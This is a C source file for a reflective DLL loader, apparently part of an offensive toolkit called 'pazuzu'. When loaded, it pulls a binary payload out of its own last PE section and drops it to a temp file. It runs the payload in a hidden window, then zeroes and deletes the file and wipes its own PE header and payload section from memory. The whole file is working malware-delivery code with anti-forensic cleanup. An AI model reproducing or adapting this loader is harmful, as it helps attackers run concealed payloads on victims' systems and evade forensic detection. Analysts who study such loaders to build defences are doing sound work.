
#include "ReflectiveLoader.h"

IMAGE_SECTION_HEADER * get_first_section_header(IMAGE_NT_HEADERS32 *ntheaders);
IMAGE_DOS_HEADER * get_mz_address();
char * get_binary_from_section();
void pazuzu();
void delete_section(IMAGE_DOS_HEADER *addr);
void delete_pe_header(IMAGE_DOS_HEADER *addr);
void clean_stuff();
void dump_payload(char *buff, DWORD dwBytesWrite);
void delete_file(TCHAR * tmp, DWORD dwBytesWrite);
void manage(char * buffer);
void execute_from_disk(char * buffer, IMAGE_NT_HEADERS32 *nt_headers);

void * addr_bin_mem = NULL;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;
	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
	case DLL_PROCESS_ATTACH:
		pazuzu();
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}

IMAGE_SECTION_HEADER * get_first_section_header(IMAGE_NT_HEADERS32 *ntheaders)
{
	return (IMAGE_SECTION_HEADER*)((IMAGE_OPTIONAL_HEADER32 *)&(*ntheaders).OptionalHeader + 1);
}

IMAGE_DOS_HEADER * get_mz_address()
{
	// Get current page in memory
	char *addr = (char *)((INT)(&get_mz_address) & 0xFFFFF000);

	// MZ still present in Reflective DLL stub: http://www.harmonysecurity.com/files/HS-P005_ReflectiveDllInjection.pdf
	// The e_lfanew field in also safe and sound
	while (true)
	{
		if ((addr[0] == 'M') && (addr[1] == 'Z'))
		{
			break;
		}
		addr = addr - 4096;
	}
	return (IMAGE_DOS_HEADER *)addr;
}

IMAGE_NT_HEADERS32 * get_ntheader(IMAGE_DOS_HEADER *addr)
{
	return (IMAGE_NT_HEADERS32 *)((char *)addr + (addr->e_lfanew));
}

char * get_binary_from_section()
{
	IMAGE_DOS_HEADER *addr = get_mz_address();
	IMAGE_NT_HEADERS32 * ntheaders = get_ntheader(addr);
	int n_sections = (*ntheaders).FileHeader.NumberOfSections;

	// Pointer first section Header
	IMAGE_SECTION_HEADER *sectionHeader = get_first_section_header(ntheaders);

	//Get payload added to the last section
	return (char *)(sectionHeader[n_sections - 1].VirtualAddress + (char*)addr);
}

void delete_file(TCHAR * tmp, DWORD dwBytesWrite)
{
	HANDLE hTempFile = INVALID_HANDLE_VALUE;
	BOOL fSuccess = FALSE;
	DWORD dwBytesWritten = 0;

	void * buffer = malloc(dwBytesWrite);
	memset((void*)buffer, 0, dwBytesWrite);

	hTempFile = CreateFile(tmp, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hTempFile != INVALID_HANDLE_VALUE)
	{
		fSuccess = WriteFile(hTempFile, buffer, dwBytesWrite, &dwBytesWritten, NULL);
		CloseHandle(hTempFile);
		DeleteFile(tmp);
	}
	free(buffer);
}

void dump_payload(char *buff, DWORD dwBytesWrite)
{
	TCHAR TempFileName[MAX_PATH];
	TCHAR TempPathBuffer[MAX_PATH];
	int uRetVal = 0;
	DWORD dwRetVal = 0;
	BOOL fSuccess = FALSE;
	DWORD dwBytesWritten = 0;
	HANDLE hTempFile = INVALID_HANDLE_VALUE;

	dwRetVal = GetTempPath(MAX_PATH, TempPathBuffer);
	if (dwRetVal == 0)
		return;

	uRetVal = GetTempFileName(TempPathBuffer, NULL, 0, TempFileName);
	if (uRetVal == 0)
		return;

	hTempFile = CreateFile(TempFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hTempFile == INVALID_HANDLE_VALUE)
		return;

	fSuccess = WriteFile(hTempFile, buff, dwBytesWrite, &dwBytesWritten, NULL);
	if (fSuccess)
	{
		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(si));
		ZeroMemory(&pi, sizeof(pi));

		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;
		DWORD createFlags = CREATE_NO_WINDOW;
		
		CloseHandle(hTempFile);

		if (CreateProcess((LPCWSTR)TempFileName, NULL, NULL, NULL, FALSE, createFlags, NULL, NULL, &si, &pi))
		{
			WaitForSingleObject(pi.hProcess, INFINITE);
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
			delete_file((TCHAR *)TempFileName, dwBytesWrite);
		}
	}
}

void manage(char * buffer)
{
	IMAGE_DOS_HEADER *addr = get_mz_address();
	IMAGE_NT_HEADERS32 *nt_headers = get_ntheader(addr);
	int n_sections = (*nt_headers).FileHeader.NumberOfSections;
	IMAGE_SECTION_HEADER *sectionHeader = get_first_section_header(nt_headers);

	//Download and run it
	dump_payload(buffer, sectionHeader[n_sections - 1].SizeOfRawData);
}

void delete_pe_header(IMAGE_DOS_HEADER *addr)
{

	IMAGE_NT_HEADERS32 * ntheaders = get_ntheader(addr);
	int n_sections = (*ntheaders).FileHeader.NumberOfSections;
	IMAGE_SECTION_HEADER *sectionHeader = get_first_section_header(ntheaders);
	int diff = (int)((char*)&sectionHeader[n_sections] - (char *)addr);
	DWORD old;
	VirtualProtect(addr, diff, PAGE_READWRITE, &old); // Not needed
	memset(addr, 0, diff);
}

void delete_section(IMAGE_DOS_HEADER *addr)
{
	IMAGE_NT_HEADERS32 * ntheaders = get_ntheader(addr);
	int n_sections = (*ntheaders).FileHeader.NumberOfSections;
	IMAGE_SECTION_HEADER *sectionHeader = get_first_section_header(ntheaders);
	void *last_section_addr = sectionHeader[n_sections - 1].VirtualAddress + (char*)addr;
	int last_section_size = sectionHeader[n_sections - 1].Misc.VirtualSize;
	DWORD old;
	VirtualProtect(last_section_addr, last_section_size, PAGE_READWRITE, &old); // Not needed
	memset(last_section_addr, 0, last_section_size);
}

void clean_stuff()
{
	IMAGE_DOS_HEADER *addr = get_mz_address();
	delete_section(addr);
	delete_pe_header(addr);
}

void pazuzu()
{
	char * buffer = NULL;
	// Get a pointer to the section containing the binary
	buffer = get_binary_from_section();
	manage(buffer);
	clean_stuff();
	ExitThread(0);
}